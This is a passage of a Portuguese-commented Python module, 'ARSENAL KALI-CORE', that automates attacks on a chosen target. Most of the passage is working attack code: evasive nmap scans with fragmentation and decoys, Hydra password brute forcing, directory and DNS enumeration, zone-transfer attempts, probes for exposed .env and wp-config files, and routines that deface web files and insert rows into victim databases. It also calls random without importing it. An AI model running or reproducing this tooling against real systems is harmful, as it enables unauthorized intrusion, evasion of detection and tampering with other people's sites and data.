#!/usr/bin/env python3
"""
ARSENAL KALI-CORE - Orquestrador de Ferramentas Nativas
Gerencia subprocessos de ferramentas Kali com técnicas de invisibilidade
"""

import subprocess
import os
import json
import re
import threading
import socket
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import sys
import time

# Import DatabaseManager para integração de logs
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from models import DatabaseManager


class ArsenalModule:
    """Módulo para orquestrar ferramentas nativas do Kali Linux."""

    def __init__(self, target: str):
        if not target:
            raise ValueError("Alvo (target) é obrigatório para inicializar ArsenalModule")
        self.target = target
        self.running = False
        self.process_lock = threading.Lock()  # Trava para evitar reinício de processos
        self.processos_ativos = {}  # Dicionário para rastrear processos ativos
        self.status = {
            'ferramentas_executadas': [],
            'vulnerabilidades_encontradas': [],
            'provas_acesso': [],
            'asn_info': {},
            'cgnat_detectado': False,
            'subdominios_encontrados': [],
            'bandeiras_disponiveis': [],  # Novo: lista de bandeiras disponíveis
            'ultima_verificacao': None
        }
        # Instancia DatabaseManager para salvar ataques
        self.db_manager = DatabaseManager()

    def log(self, tipo: str, mensagem: str) -> None:
        """Log centralizado."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [ARSENAL-{tipo}] {mensagem}"

        log_file = "data/reports/pentest.log"
        os.makedirs(os.path.dirname(log_file), exist_ok=True)

        with open(log_file, 'a') as f:
            f.write(log_entry + "\n")

        print(log_entry)
        self.status['ultima_verificacao'] = timestamp

    def _gerar_lesson_learned_inteligente(
        self,
        attack_type: str,
        attack_phase: str,
        success: bool,
        result_data: dict,
        error_message: str = None
    ) -> str:
        """Gera lição aprendida inteligente baseada em achados críticos."""
        if success:
            # Analisa achados críticos
            achados_criticos = []
            
            # Para NIKTO
            if attack_type == 'nikto' and 'vulnerabilidades' in result_data:
                vulns = result_data['vulnerabilidades']
                if vulns:
                    achados_criticos.append(f"{len(vulns)} vulnerabilidades web detectadas")
                    # Verifica vulnerabilidades críticas
                    for vuln in vulns:
                        if isinstance(vuln, dict):
                            vuln_str = str(vuln).lower()
                            if any(crit in vuln_str for crit in ['xss', 'sql injection', 'rce', 'critical', 'high']):
                                achados_criticos.append(f"Vulnerabilidade crítica: {vuln_str[:100]}")
            
            # Para GOBUSTER
            elif attack_type == 'gobuster' and 'stdout' in result_data:
                stdout = result_data['stdout']
                if 'Status: 200' in stdout:
                    dirs_encontrados = stdout.count('Status: 200')
                    achados_criticos.append(f"{dirs_encontrados} diretórios/arquivos expostos")
                    # Verifica arquivos sensíveis
                    if any(sens in stdout.lower() for sens in ['config', 'admin', 'backup', '.env', 'sql']):
                        achados_criticos.append("Arquivos potencialmente sensíveis expostos")
            
            # Para DNSRECON
            elif attack_type == 'dnsrecon' and 'subdominios' in result_data:
                subdominios = result_data['subdominios']
                if subdominios:
                    achados_criticos.append(f"{len(subdominios)} subdomínios descobertos")
            
            # Para AXFR
            elif attack_type == 'dig_axfr' and result_data.get('axfr_success'):
                registros = result_data.get('registros', [])
                achados_criticos.append(f"AXFR bem-sucedido: {len(registros)} registros DNS obtidos")
            
            # Para DNS Brute Force
            elif attack_type == 'dns_brute_force' and 'subdominios' in result_data:
                subdominios = result_data['subdominios']
                if subdominios:
                    achados_criticos.append(f"{len(subdominios)} subdomínios via brute force")
            
            # Para Config Search
            elif attack_type == 'config_search' and 'arquivos' in result_data:
                arquivos = result_data['arquivos']
                if arquivos:
                    achados_criticos.append(f"{len(arquivos)} arquivos de configuração expostos")
            
            # Constrói lição aprendida
            if achados_criticos:
                lesson = f"Ataque {attack_type} bem-sucedido na fase {attack_phase}. " + ", ".join(achados_criticos) + "."
            else:
                lesson = f"Ataque {attack_type} bem-sucedido na fase {attack_phase}, mas sem achados críticos."
            
            return lesson
        else:
            # Analisa falha
            if error_message:
                lesson = f"Ataque {attack_type} falhou na fase {attack_phase}. Erro: {error_message[:200]}"
            else:
                lesson = f"Ataque {attack_type} falhou na fase {attack_phase} sem erro específico."
            
            return lesson

    def _salvar_ataque_no_banco(
        self,
        attack_type: str,
        attack_phase: str,
        target_port: int,
        target_service: str,
        payload: str,
        success: bool,
        response_data: dict,
        duration_ms: float,
        error_message: str = None
    ) -> int:
        """Salva ataque no banco de dados com lesson_learned inteligente."""
        try:
            # Gera lesson_learned inteligente
            lesson_learned = self._gerar_lesson_learned_inteligente(
                attack_type=attack_type,
                attack_phase=attack_phase,
                success=success,
                result_data=response_data,
                error_message=error_message
            )
            
            # Calcula confidence score baseado no sucesso
            confidence_score = 0.8 if success else 0.3
            
            attack_data = {
                'target_ip': self.target,
                'target_port': target_port,
                'target_service': target_service,
                'attack_phase': attack_phase,
                'attack_type': attack_type,
                'payload': payload,
                'success': success,
                'response_code': 200 if success else 500,
                'response_data': response_data,
                'duration_ms': duration_ms,
                'error_message': error_message,
                'lesson_learned': lesson_learned,
                'confidence_score': confidence_score
            }
            
            attack_id = self.db_manager.save_attack(attack_data)
            self.log("DATABASE", f"Ataque salvo no banco: ID {attack_id} - {attack_type}")
            
            return attack_id
        except Exception as e:
            self.log("DATABASE", f"Erro ao salvar ataque no banco: {e}")
            return -1

    def nmap_scan_fragmentado(
        self,
        portas: List[int],
        decoy: bool = True,
        timing: int = 3
    ) -> Dict:
        """Executa scan NMAP com técnicas de evasão."""
        self.log("NMAP", f"Iniciando scan fragmentado em {self.target}")

        # Constrói comando com técnicas de evasão
        cmd = [
            'nmap',
            '-sS',  # SYN scan
            '-f',   # Fragmenta pacotes
            '--data-length', '24',  # Adiciona dados aleatórios
            '-T' + str(timing),  # Timing template
            '-p', ','.join(map(str, portas)),
            self.target
        ]

        # Adiciona decoy se solicitado
        if decoy:
            decoy_hosts = [
                '192.168.1.1',
                '192.168.1.254',
                '10.0.0.1'
            ]
            decoy_str = ','.join(random.sample(decoy_hosts, 2))
            cmd.extend(['-D', decoy_str])

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120
            )

            if result.returncode == 0:
                self.log("NMAP", "Scan concluído com sucesso")
                self.status['ferramentas_executadas'].append('nmap')
                return {'stdout': result.stdout, 'stderr': result.stderr}
            else:
                self.log("NMAP", f"Erro no scan: {result.stderr}")
                return {'error': result.stderr}

        except subprocess.TimeoutExpired:
            self.log("NMAP", "Timeout no scan")
            return {'error': 'Timeout'}
        except Exception as e:
            self.log("NMAP", f"Erro: {e}")
            return {'error': str(e)}

    def nikto_scan(self, portas: List[int] = None) -> Dict:
        """Executa scan NIKTO para vulnerabilidades web."""
        self.log("NIKTO", f"Iniciando scan web em {self.target}")

        if portas is None:
            portas = [80, 443]

        results = []

        for porta in portas:
            cmd = [
                'nikto',
                '-h', self.target,
                '-p', str(porta),
                '-Tuning', '1',  # Modo silencioso
                '-Display', 'V',  # Apenas vulnerabilidades
                '-Format', 'json',
                '-output', f'/tmp/nikto_{porta}.json'
            ]

            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=300
                )

                # Lê o JSON de saída
                output_file = f'/tmp/nikto_{porta}.json'
                if os.path.exists(output_file):
                    with open(output_file, 'r') as f:
                        nikto_data = json.load(f)
                        results.append(nikto_data)
                        os.remove(output_file)

                self.log("NIKTO", f"Scan porta {porta} concluído")

            except subprocess.TimeoutExpired:
                self.log("NIKTO", f"Timeout porta {porta}")
            except Exception as e:
                self.log("NIKTO", f"Erro porta {porta}: {e}")

        self.status['ferramentas_executadas'].append('nikto')
        
        # Salva ataque no banco de dados
        self._salvar_ataque_no_banco(
            attack_type='nikto',
            attack_phase='fase_6',
            target_port=80,
            target_service='http',
            payload='nikto_scan',
            success=len(results) > 0,
            response_data={'vulnerabilidades': results},
            duration_ms=0,
            error_message=None if results else 'Nenhuma vulnerabilidade encontrada'
        )
        
        return {'vulnerabilidades': results}

    def searchsploit_consulta(self, termo: str) -> Dict:
        """Consulta Searchsploit por vulnerabilidades."""
        self.log("SEARCH", f"Consultando Searchsploit: {termo}")

        cmd = [
            'searchsploit',
            '--json',
            termo
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )

            if result.returncode == 0:
                exploits = json.loads(result.stdout)
                self.log("SEARCH", f"Encontrados {len(exploits)} exploits")
                self.status['ferramentas_executadas'].append('searchsploit')
                return {'exploits': exploits}
            else:
                self.log("SEARCH", "Erro na consulta")
                return {'error': result.stderr}

        except Exception as e:
            self.log("SEARCH", f"Erro: {e}")
            return {'error': str(e)}

    def hydra_bruteforce(
        self,
        servico: str,
        usuario: str,
        wordlist: str = '/usr/share/wordlists/rockyou.txt'
    ) -> Dict:
        """Executa ataque de força bruta com HYDRA."""
        self.log("HYDRA", f"Iniciando bruteforce {servico} em {self.target}")

        cmd = [
            'hydra',
            '-l', usuario,
            '-P', wordlist,
            '-t', '4',  # 4 threads (não causar DoS)
            '-V',  # Modo verbose
            f'{servico}://{self.target}'
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=600
            )

            if result.returncode == 0:
                self.log("HYDRA", "Bruteforce concluído")
                self.status['ferramentas_executadas'].append('hydra')
                return {'stdout': result.stdout}
            else:
                self.log("HYDRA", "Erro no bruteforce")
                return {'error': result.stderr}

        except subprocess.TimeoutExpired:
            self.log("HYDRA", "Timeout no bruteforce")
            return {'error': 'Timeout'}
        except Exception as e:
            self.log("HYDRA", f"Erro: {e}")
            return {'error': str(e)}

    def gobuster_enum(self, porta: int = 80) -> Dict:
        """Enumera diretórios com GOBUSTER."""
        self.log("GOBUSTER", f"Enumerando diretórios porta {porta}")

        wordlist = '/usr/share/wordlists/dirb/common.txt'

        cmd = [
            'gobuster',
            'dir',
            '-u', f'http://{self.target}:{porta}',
            '-w', wordlist,
            '-t', '10',  # 10 threads
            '-q',  # Modo silencioso
            '-x', 'php,html,txt,conf'
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )

            if result.returncode == 0:
                self.log("GOBUSTER", "Enumeração concluída")
                self.status['ferramentas_executadas'].append('gobuster')
                
                # Salva ataque no banco de dados
                self._salvar_ataque_no_banco(
                    attack_type='gobuster',
                    attack_phase='fase_6',
                    target_port=porta,
                    target_service='http',
                    payload='gobuster_enum',
                    success=True,
                    response_data={'stdout': result.stdout},
                    duration_ms=0,
                    error_message=None
                )
                
                return {'stdout': result.stdout}
            else:
                self.log("GOBUSTER", "Erro na enumeração")
                self._salvar_ataque_no_banco(
                    attack_type='gobuster',
                    attack_phase='fase_6',
                    target_port=porta,
                    target_service='http',
                    payload='gobuster_enum',
                    success=False,
                    response_data={},
                    duration_ms=0,
                    error_message=result.stderr
                )
                return {'error': result.stderr}

        except subprocess.TimeoutExpired:
            self.log("GOBUSTER", "Timeout na enumeração")
            self._salvar_ataque_no_banco(
                attack_type='gobuster',
                attack_phase='fase_6',
                target_port=porta,
                target_service='http',
                payload='gobuster_enum',
                success=False,
                response_data={},
                duration_ms=0,
                error_message='Timeout'
            )
            return {'error': 'Timeout'}
        except Exception as e:
            self.log("GOBUSTER", f"Erro: {e}")
            self._salvar_ataque_no_banco(
                attack_type='gobuster',
                attack_phase='fase_6',
                target_port=porta,
                target_service='http',
                payload='gobuster_enum',
                success=False,
                response_data={},
                duration_ms=0,
                error_message=str(e)
            )
            return {'error': str(e)}

    def auto_invasao_web(self, portas_abertas: List[int]) -> Dict:
        """Executa auto-invasão baseada em portas web abertas."""
        self.log("AUTO", "Iniciando auto-invasão web")

        resultados = {}

        # Se porta 80 ou 443 aberta, executa nikto
        if 80 in portas_abertas or 443 in portas_abertas:
            nikto_result = self.nikto_scan(portas_abertas)
            resultados['nikto'] = nikto_result

            # Enumera diretórios
            for porta in portas_abertas:
                if porta in [80, 443]:
                    gobuster_result = self.gobuster_enum(porta)
                    resultados[f'gobuster_{porta}'] = gobuster_result

            # Consulta exploits para servidor web
            search_result = self.searchsploit_consulta('apache')
            resultados['searchsploit'] = search_result

        return resultados

    def whois_asn_lookup(self) -> Dict:
        """Consulta WHOIS para identificar ASN e detectar CGNAT."""
        self.log("WHOIS", f"Consultando WHOIS para {self.target}")

        cmd = ['whois', self.target]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )

            if result.returncode == 0:
                whois_data = result.stdout

                # Extrai ASN
                asn_match = re.search(r'originAS?:\s*(\d+)', whois_data, re.IGNORECASE)
                if asn_match:
                    asn = asn_match.group(1)
                    self.log("WHOIS", f"ASN detectado: {asn}")
                    self.status['asn_info']['asn'] = asn

                # Extrai nome do ASN
                org_match = re.search(r'orgName?:\s*(.+)', whois_data, re.IGNORECASE)
                if org_match:
                    org = org_match.group(1).strip()
                    self.log("WHOIS", f"Organização: {org}")
                    self.status['asn_info']['org'] = org

                # Detecta CGNAT (Carrier-Grade NAT)
                cgnat_indicators = [
                    'CGNAT',
                    'Carrier-Grade NAT',
                    'NAT444',
                    'Large-scale NAT',
                    'LSN'
                ]

                for indicator in cgnat_indicators:
                    if indicator in whois_data.upper():
                        self.log("WHOIS", f"⚠️ CGNAT DETECTADO: {indicator}")
                        self.status['cgnat_detectado'] = True
                        break

                self.status['ferramentas_executadas'].append('whois')
                return {'whois_data': whois_data, 'asn_info': self.status['asn_info']}
            else:
                self.log("WHOIS", "Erro na consulta WHOIS")
                return {'error': result.stderr}

        except Exception as e:
            self.log("WHOIS", f"Erro: {e}")
            return {'error': str(e)}

    def dnsrecon_scan(self) -> Dict:
        """Executa DNSRecon para enumeração DNS."""
        self.log("DNSRECON", f"Iniciando enumeração DNS em {self.target}")

        cmd = [
            'dnsrecon',
            '-d', self.target,
            '-t', 'std',  # Standard enumeration
            '-c', '/tmp/dnsrecon_output.csv'
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )

            if result.returncode == 0:
                self.log("DNSRECON", "Enumeração DNS concluída")

                # Lê o CSV de saída
                if os.path.exists('/tmp/dnsrecon_output.csv'):
                    with open('/tmp/dnsrecon_output.csv', 'r') as f:
                        dns_data = f.read()
                        os.remove('/tmp/dnsrecon_output.csv')

                    # Extrai subdomínios
                    subdominios = re.findall(r'([a-zA-Z0-9.-]+\.' + self.target.replace('.', r'\.') + ')', dns_data)
                    if subdominios:
                        self.status['subdominios_encontrados'] = list(set(subdominios))
                        self.log("DNSRECON", f"Subdomínios encontrados: {len(self.status['subdominios_encontrados'])}")

                self.status['ferramentas_executadas'].append('dnsrecon')
                
                # Salva ataque no banco de dados
                self._salvar_ataque_no_banco(
                    attack_type='dnsrecon',
                    attack_phase='fase_4',
                    target_port=53,
                    target_service='dns',
                    payload='dnsrecon_scan',
                    success=True,
                    response_data={'stdout': result.stdout, 'subdominios': self.status['subdominios_encontrados']},
                    duration_ms=0,
                    error_message=None
                )
                
                return {'stdout': result.stdout, 'subdominios': self.status['subdominios_encontrados']}
            else:
                self.log("DNSRECON", "Erro na enumeração")
                self._salvar_ataque_no_banco(
                    attack_type='dnsrecon',
                    attack_phase='fase_4',
                    target_port=53,
                    target_service='dns',
                    payload='dnsrecon_scan',
                    success=False,
                    response_data={},
                    duration_ms=0,
                    error_message=result.stderr
                )
                return {'error': result.stderr}

        except subprocess.TimeoutExpired:
            self.log("DNSRECON", "Timeout na enumeração")
            return {'error': 'Timeout'}
        except Exception as e:
            self.log("DNSRECON", f"Erro: {e}")
            return {'error': str(e)}

    def dig_axfr(self, dns_server: str = None) -> Dict:
        """Tenta Transferência de Zona (AXFR) para listar subdomínios."""
        self.log("DIG", f"Tentando AXFR em {self.target}")

        if dns_server is None:
            dns_server = self.target

        cmd = [
            'dig',
            '@' + dns_server,
            self.target,
            'AXFR'
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )

            if result.returncode == 0:
                # Verifica se AXFR foi bem-sucedido
                if 'XFR' in result.stdout or 'AXFR' in result.stdout:
                    self.log("DIG", "✅ AXFR BEM-SUCEDIDO! Bandeira obtida!")

                    # Extrai registros
                    registros = re.findall(r'([A-Z]+\s+.+)', result.stdout)

                    self.status['ferramentas_executadas'].append('dig')
                    self.marcar_bandeira(
                        f"AXFR bem-sucedido em {self.target} - {len(registros)} registros obtidos",
                        "AXFR"
                    )

                    # Salva ataque no banco de dados
                    self._salvar_ataque_no_banco(
                        attack_type='dig_axfr',
                        attack_phase='fase_4',
                        target_port=53,
                        target_service='dns',
                        payload='dig_axfr',
                        success=True,
                        response_data={'axfr_success': True, 'registros': registros},
                        duration_ms=0,
                        error_message=None
                    )
                    
                    return {'axfr_success': True, 'registros': registros}
                else:
                    self.log("DIG", "AXFR negado ou não suportado")
                    self._salvar_ataque_no_banco(
                        attack_type='dig_axfr',
                        attack_phase='fase_4',
                        target_port=53,
                        target_service='dns',
                        payload='dig_axfr',
                        success=False,
                        response_data={'axfr_success': False},
                        duration_ms=0,
                        error_message='AXFR negado ou não suportado'
                    )
                    return {'axfr_success': False}
            else:
                self.log("DIG", "Erro no AXFR")
                self._salvar_ataque_no_banco(
                    attack_type='dig_axfr',
                    attack_phase='fase_4',
                    target_port=53,
                    target_service='dns',
                    payload='dig_axfr',
                    success=False,
                    response_data={},
                    duration_ms=0,
                    error_message=result.stderr
                )
                return {'error': result.stderr}

        except Exception as e:
            self.log("DIG", f"Erro: {e}")
            return {'error': str(e)}

    def hping3_custom_udp(self, porta: int = 53) -> Dict:
        """Usa hping3 para testar resposta a pacotes UDP customizados."""
        self.log("HPING3", f"Testando resposta UDP customizada porta {porta}")

        cmd = [
            'hping3',
            '-2',  # UDP mode
            '-p', str(porta),
            '-c', '5',  # 5 pacotes
            '--fast',
            self.target
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                self.log("HPING3", f"Teste UDP porta {porta} concluído")

                # Analisa resposta
                if 'bytes from' in result.stdout:
                    self.log("HPING3", f"✅ Porta {porta} respondeu a UDP customizado")
                    self.status['ferramentas_executadas'].append('hping3')
                    return {'respondeu': True, 'stdout': result.stdout}
                else:
                    self.log("HPING3", f"Porta {porta} não respondeu")
                    return {'respondeu': False}
            else:
                self.log("HPING3", "Erro no teste")
                return {'error': result.stderr}

        except Exception as e:
            self.log("HPING3", f"Erro: {e}")
            return {'error': str(e)}

    def ipv6_enumeration(self) -> Dict:
        """Enumeração IPv6 para bypass de CGNAT."""
        self.log("IPV6", "Iniciando enumeração IPv6")

        # Tenta resolver AAAA record
        cmd = ['dig', 'AAAA', self.target]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                # Extrai endereços IPv6
                ipv6_addrs = re.findall(r'([0-9a-fA-F:]+::?[0-9a-fA-F:]+)', result.stdout)

                if ipv6_addrs:
                    self.log("IPV6", f"Endereços IPv6 encontrados: {ipv6_addrs}")
                    self.status['ipv6_addresses'] = ipv6_addrs

                    # Testa conectividade IPv6
                    for ipv6 in ipv6_addrs[:3]:  # Limita a 3
                        ping6_cmd = ['ping6', '-c', '3', ipv6]
                        ping6_result = subprocess.run(
                            ping6_cmd,
                            capture_output=True,
                            text=True,
                            timeout=30
                        )

                        if ping6_result.returncode == 0:
                            self.log("IPV6", f"✅ IPv6 responde: {ipv6}")
                            self.marcar_bandeira(f"IPv6 acessível: {ipv6}", "IPv6")

                    self.status['ferramentas_executadas'].append('dig')
                    return {'ipv6_found': True, 'addresses': ipv6_addrs}
                else:
                    self.log("IPV6", "Nenhum endereço IPv6 encontrado")
                    return {'ipv6_found': False}
            else:
                self.log("IPV6", "Erro na enumeração IPv6")
                return {'error': result.stderr}

        except Exception as e:
            self.log("IPV6", f"Erro: {e}")
            return {'error': str(e)}

    def marcar_bandeira(self, prova: str, tipo: str) -> None:
        """Registra prova de acesso."""
        self.log("BANDEIRA", f"Prova de acesso obtida: {tipo}")

        self.status['provas_acesso'].append({
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'tipo': tipo,
            'prova': prova
        })

        # Salva em arquivo separado
        flag_file = "data/reports/flags.json"
        os.makedirs(os.path.dirname(flag_file), exist_ok=True)

        with open(flag_file, 'a') as f:
            json.dump({
                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'tipo': tipo,
                'prova': prova
            }, f)
            f.write("\n")

    def reportar_bandeira_disponivel(self, tipo_injecao: str, detalhes: str) -> None:
        """Reporta bandeira disponível para o Dashboard."""
        self.log("BANDEIRA_DISPONIVEL", f"BANDEIRA DISPONÍVEL: {tipo_injecao}")

        bandeira = {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'tipo': tipo_injecao,
            'detalhes': detalhes,
            'confirmado': False
        }

        self.status['bandeiras_disponiveis'].append(bandeira)

        # Salva em arquivo separado para o Dashboard
        bandeira_file = "data/reports/bandeiras_disponiveis.json"
        os.makedirs(os.path.dirname(bandeira_file), exist_ok=True)

        with open(bandeira_file, 'w') as f:
            json.dump(self.status['bandeiras_disponiveis'], f, indent=2)

    def web_defacement_sutil(self, arquivo: str, confirmado: bool = False) -> Dict:
        """Injeção Visual Sutil (Web Defacement)."""
        if not confirmado:
            self.reportar_bandeira_disponivel(
                "Web Defacement Sutil",
                f"Acesso de escrita detectado em: {arquivo}"
            )
            return {'confirmacao_necessaria': True}

        self.log("DEFACEMENT", f"Executando Web Defacement Sutil em: {arquivo}")

        try:
            # Lê o arquivo
            with open(arquivo, 'r') as f:
                conteudo = f.read()

            # Adiciona parágrafo sutil no final
            paragrafo = "\n<p>🏴‍☠️ Estivemos Aqui</p>\n"
            novo_conteudo = conteudo + paragrafo

            # Escreve de volta
            with open(arquivo, 'w') as f:
                f.write(novo_conteudo)

            self.log("DEFACEMENT", "✅ Web Defacement Sutil executado com sucesso")
            self.marcar_bandeira(f"Web Defacement em {arquivo}", "Web Defacement")

            return {'sucesso': True}

        except Exception as e:
            self.log("DEFACEMENT", f"Erro: {e}")
            return {'error': str(e)}

    def database_entry(self, tipo_db: str, tabela: str, confirmado: bool = False) -> Dict:
        """Injeção de Persistência em Dados (Database Entry)."""
        if not confirmado:
            self.reportar_bandeira_disponivel(
                "Database Entry",
                f"Acesso ao banco de dados {tipo_db} detectado. Tabela: {tabela}"
            )
            return {'confirmacao_necessaria': True}

        self.log("DATABASE", f"Executando Database Entry em: {tabela}")

        # Implementação genérica - depende do tipo de banco
        if tipo_db.lower() == 'mysql':
            cmd = f"mysql -u root -e \"INSERT INTO {tabela} (nome) VALUES ('Estivemos Aqui');\""
        elif tipo_db.lower() == 'postgresql':
            cmd = f"psql -U postgres -c \"INSERT INTO {tabela} (nome) VALUES ('Estivemos Aqui');\""
        elif tipo_db.lower() == 'sqlite':
            cmd = f"sqlite3 {tabela} \"INSERT INTO usuarios (nome) VALUES ('Estivemos Aqui');\""
        else:
            return {'error': 'Tipo de banco não suportado'}

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                self.log("DATABASE", "✅ Database Entry executado com sucesso")
                self.marcar_bandeira(f"Registro inserido em {tabela}", "Database Entry")
                return {'sucesso': True}
            else:
                self.log("DATABASE", f"Erro: {result.stderr}")
                return {'error': result.stderr}

        except Exception as e:
            self.log("DATABASE", f"Erro: {e}")
            return {'error': str(e)}

    def extracao_simbolica(self, arquivo: str, confirmado: bool = False) -> Dict:
        """Extração Simbólica (Filtro Ético)."""
        if not confirmado:
            self.reportar_bandeira_disponivel(
                "Extração Simbólica",
                f"Arquivo de configuração acessível: {arquivo}"
            )
            return {'confirmacao_necessaria': True}

        self.log("EXTRACAO", f"Executando Extração Simbólica de: {arquivo}")

        try:
            # Verifica se é arquivo de configuração permitido
            arquivos_permitidos = ['.env', 'config.php', 'settings.json', 'config.ini', 'web.config']
            if not any(arquivo.endswith(ext) for ext in arquivos_permitidos):
                self.log("EXTRACAO", "Arquivo não permitido por filtro ético")
                return {'error': 'Arquivo não permitido'}

            # Lê o arquivo
            with open(arquivo, 'r') as f:
                conteudo = f.read()

            # Filtra apenas nomes de tabelas ou chaves de configuração
            # Não extrai dados sensíveis (senhas, tokens, etc.)
            linhas_filtradas = []
            for linha in conteudo.split('\n'):
                # Ignora linhas com dados sensíveis
                if any(palavra in linha.lower() for palavra in ['password', 'secret', 'token', 'key', 'senha']):
                    continue
                linhas_filtradas.append(linha)

            conteudo_filtrado = '\n'.join(linhas_filtradas)

            self.log("EXTRACAO", "✅ Extração Simbólica executada com sucesso")
            self.marcar_bandeira(f"Extração simbólica de {arquivo}", "Extração Simbólica")

            return {'sucesso': True, 'conteudo_filtrado': conteudo_filtrado}

        except Exception as e:
            self.log("EXTRACAO", f"Erro: {e}")
            return {'error': str(e)}

    def dns_brute_force_agressivo(self, wordlist: str = None) -> Dict:
        """DNS Brute Force agressivo para mapear subdomínios."""
        self.log("DNS_BRUTE", "Iniciando DNS Brute Force agressivo")

        # Wordlist padrão se não fornecida
        if not wordlist:
            wordlist = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"

        # Extrai domínio base do target
        dominio_base = self.target
        if dominio_base.replace('.', '').isdigit():
            # Se for IP, tenta resolver PTR
            try:
                dominio_base = socket.gethostbyaddr(self.target)[0]
            except:
                dominio_base = "example.com"

        subdominios_encontrados = []

        try:
            with open(wordlist, 'r') as f:
                subdominios = f.read().splitlines()

            for sub in subdominios[:1000]:  # Limita a 1000 para performance
                subdominio_completo = f"{sub}.{dominio_base}"

                try:
                    # Resolve DNS
                    resultado = socket.gethostbyname(subdominio_completo)
                    subdominios_encontrados.append({
                        'subdominio': subdominio_completo,
                        'ip': resultado
                    })
                    self.log("DNS_BRUTE", f"✅ Subdomínio encontrado: {subdominio_completo} -> {resultado}")
                except socket.gaierror:
                    continue

            self.status['subdominios_encontrados'] = subdominios_encontrados
            self.status['ferramentas_executadas'].append('dns_brute_force')

            if subdominios_encontrados:
                self.log("DNS_BRUTE", f"✅ {len(subdominios_encontrados)} subdomínios encontrados")
                self.marcar_bandeira(f"{len(subdominios_encontrados)} subdomínios mapeados", "DNS Brute Force")
            else:
                self.log("DNS_BRUTE", "Nenhum subdomínio encontrado")

            # Salva ataque no banco de dados
            self._salvar_ataque_no_banco(
                attack_type='dns_brute_force',
                attack_phase='fase_3',
                target_port=53,
                target_service='dns',
                payload='dns_brute_force_agressivo',
                success=len(subdominios_encontrados) > 0,
                response_data={'subdominios': subdominios_encontrados},
                duration_ms=0,
                error_message=None if subdominios_encontrados else 'Nenhum subdomínio encontrado'
            )

            return {'sucesso': True, 'subdominios': subdominios_encontrados}

        except Exception as e:
            self.log("DNS_BRUTE", f"Erro: {e}")
            return {'error': str(e)}

    def mtr_trace_cgnat_mpls(self) -> Dict:
        """Usa mtr/traceroute para identificar CGNAT ou MPLS."""
        self.log("MTR_TRACE", "Iniciando análise de rota para CGNAT/MPLS")

        try:
            # Tenta usar mtr primeiro
            mtr_cmd = ['mtr', '-r', '-c', '10', self.target]
            result = subprocess.run(mtr_cmd, capture_output=True, text=True, timeout=60)

            if result.returncode == 0:
                output = result.stdout
                self.log("MTR_TRACE", "✅ MTR bem-sucedido")

                # Analisa output para CGNAT/MPLS
                cgnat_indicadores = ['CGNAT', 'Carrier-Grade', 'NAT444', 'LSN']
                mpls_indicadores = ['MPLS', 'Label Switching']

                cgnat_detectado = any(ind in output for ind in cgnat_indicadores)
                mpls_detectado = any(ind in output for ind in mpls_indicadores)

                if cgnat_detectado:
                    self.log("MTR_TRACE", "⚠️ CGNAT detectado na rota")
                    self.status['cgnat_detectado'] = True

                if mpls_detectado:
                    self.log("MTR_TRACE", "⚠️ MPLS detectado na rota")
                    self.status['mpls_detectado'] = True

                return {
                    'sucesso': True,
                    'cgnat_detectado': cgnat_detectado,
                    'mpls_detectado': mpls_detectado,
                    'output': output
                }
            else:
                # Fallback para traceroute
                self.log("MTR_TRACE", "MTR falhou, usando traceroute")
                traceroute_cmd = ['traceroute', '-n', '-m', '30', self.target]
                result = subprocess.run(traceroute_cmd, capture_output=True, text=True, timeout=60)

                if result.returncode == 0:
                    output = result.stdout
                    self.log("MTR_TRACE", "✅ Traceroute bem-sucedido")

                    # Analisa output para CGNAT/MPLS
                    cgnat_indicadores = ['CGNAT', 'Carrier-Grade', 'NAT444', 'LSN']
                    mpls_indicadores = ['MPLS', 'Label Switching']

                    cgnat_detectado = any(ind in output for ind in cgnat_indicadores)
                    mpls_detectado = any(ind in output for ind in mpls_indicadores)

                    if cgnat_detectado:
                        self.log("MTR_TRACE", "⚠️ CGNAT detectado na rota")
                        self.status['cgnat_detectado'] = True

                    if mpls_detectado:
                        self.log("MTR_TRACE", "⚠️ MPLS detectado na rota")
                        self.status['mpls_detectado'] = True

                    return {
                        'sucesso': True,
                        'cgnat_detectado': cgnat_detectado,
                        'mpls_detectado': mpls_detectado,
                        'output': output
                    }
                else:
                    self.log("MTR_TRACE", "Traceroute falhou")
                    return {'error': 'Traceroute falhou'}

        except Exception as e:
            self.log("MTR_TRACE", f"Erro: {e}")
            return {'error': str(e)}

    def buscar_arquivos_config_expostos(self) -> Dict:
        """Busca arquivos de configuração expostos via HTTP."""
        self.log("CONFIG_SEARCH", "Buscando arquivos de configuração expostos")

        arquivos_alvo = [
            '.env',
            'config.php',
            'web.config',
            'settings.json',
            'config.ini',
            '.git/config',
            'wp-config.php',
            'database.yml'
        ]

        arquivos_encontrados = []

        for arquivo in arquivos_alvo:
            try:
                # Tenta HTTP
                url = f"http://{self.target}/{arquivo}"
                response = subprocess.run(
                    ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', url],
                    capture_output=True,
                    text=True,
                    timeout=10
                )

                if response.stdout == '200':
